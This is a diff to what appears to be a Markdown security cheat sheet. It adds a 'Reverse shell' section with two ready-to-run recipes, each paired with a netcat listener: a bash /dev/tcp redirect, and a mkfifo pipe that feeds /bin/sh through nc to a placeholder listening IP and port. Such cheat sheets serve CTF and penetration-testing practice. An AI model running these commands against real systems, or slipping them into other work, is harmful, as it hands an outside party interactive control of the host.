@@ -18,6 +18,10 @@
   * https://www.nayuki.io/page/automatic-caesar-cipher-breaker-javascript
   
 ## Reverse shell
-### Netcat
-* Server: 
-* Client:
+### 1 - S: bash ; C: nc
+* Server: bash -i >& /dev/tcp/LISTENING-IP/LISTENING-PORT 0>&1
+* Client: nc -nlvp LISTENING-PORT
+
+### 2 - S: nc ; C: nc
+* Server: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LISTENING-IP LISTENING-PORT >/tmp/f
+* Client: nc -nlvp LISTENING-PORT
